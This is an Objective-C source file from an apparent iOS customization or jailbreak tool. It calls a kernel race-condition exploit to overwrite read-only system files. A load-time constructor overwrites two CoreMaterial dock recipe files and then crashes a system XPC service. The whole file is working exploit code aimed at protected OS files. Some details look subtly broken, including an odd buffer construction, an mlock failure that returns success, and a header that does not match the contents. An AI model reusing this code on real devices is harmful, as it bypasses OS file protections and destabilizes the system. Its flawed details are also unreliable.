//
//  server.c
//  iDownload
//
//  Created by Linus Henze on 2020-02-09.
//  Copyright © 2020/2021 Linus Henze. All rights reserved.
//

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <errno.h>
#include <unistd.h>
#include <dispatch/dispatch.h>
#include <limits.h>
#include <dirent.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <CoreFoundation/CoreFoundation.h>
#include <Foundation/Foundation.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "Exploit/grant_full_disk_access.h"
#include "Exploit/helpers.h"
#include "Exploit/vm_unaligned_copy_switch_race.h"

BOOL overwriteFileWithDataImpl(NSString *originPath, NSData *replacementData) { // cowabunga function converted to objc
#if false
    NSString *documentDirectory = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) objectAtIndex:0];
    NSString *pathToRealTarget = originPath;
    NSData *origData = [NSData dataWithContentsOfFile:pathToRealTarget];
    [origData writeToFile:targetPath atomically:YES];
#endif
    
    // open and map original font
    const char *fdPath = [originPath fileSystemRepresentation];
    int fd = open(fdPath, O_RDONLY | O_CLOEXEC);
    if (fd == -1) {
        NSLog(@"Could not open target file");
        return NO;
    }
    // check size of font
    off_t originalFileSize = lseek(fd, 0, SEEK_END);
    if (originalFileSize < replacementData.length) {
        NSLog(@"File too big");
        return NO;
    }
    lseek(fd, 0, SEEK_SET);
    
    // Map the font we want to overwrite so we can mlock it
    void *fileMap = mmap(NULL, replacementData.length, PROT_READ, MAP_SHARED, fd, 0);
    if (fileMap == MAP_FAILED) {
        NSLog(@"Failed to map");
        return NO;
    }
    // mlock so the file gets cached in memory
    if (mlock(fileMap, replacementData.length) != 0) {
        NSLog(@"Failed to mlock");
        return YES;
    }
    
    // for every 16k chunk, rewrite
    for (NSUInteger chunkOff = 0; chunkOff < replacementData.length; chunkOff += 0x4000) {
        NSLog(@"%lx", chunkOff);
        NSRange range = NSMakeRange(chunkOff, MIN(replacementData.length - chunkOff, 0x4000));
        NSData *dataChunk = [replacementData subdataWithRange:range];
        BOOL overwroteOne = NO;
        for (int i = 0; i < 2; i++) {
            __block bool overwriteSucceeded = false;
            [dataChunk enumerateByteRangesUsingBlock:^(const void *bytes, NSRange byteRange, BOOL *stop) {
                overwriteSucceeded = unaligned_copy_switch_race(fd, chunkOff, bytes, byteRange.length);
                *stop = overwriteSucceeded;
            }];
            if (overwriteSucceeded) {
                overwroteOne = YES;
                break;
            }
            NSLog(@"try again?!");
        }
        if (!overwroteOne) {
            NSLog(@"Failed to overwrite");
            return NO;
        }
    }
    return YES;
}

__attribute__((constructor))
static void dylibMain() {
    NSString *originalPathDark = @"/System/Library/PrivateFrameworks/CoreMaterial.framework/dockDark.materialrecipe";
    NSString *originalPathLight = @"/System/Library/PrivateFrameworks/CoreMaterial.framework/dockLight.materialrecipe";
    NSData *randomData = [[NSMutableData dataWithLength:32] initWithBytes:(__bridge const void *)(NSMutableData * _Nonnull[]){ nil } length:32];
    
    BOOL successDark = overwriteFileWithDataImpl(originalPathDark, randomData);
    if (successDark) {
        NSLog(@"Dark overwrite succeeded");
    } else {
        NSLog(@"Dark overwrite failed");
    }
    
    BOOL successLight = overwriteFileWithDataImpl(originalPathLight, randomData);
    if (successLight) {
        NSLog(@"Light overwrite succeeded");
    } else {
        NSLog(@"Light overwrite failed");
    }
    
    xpc_crasher("com.apple.frontboard.systemappservices");
}
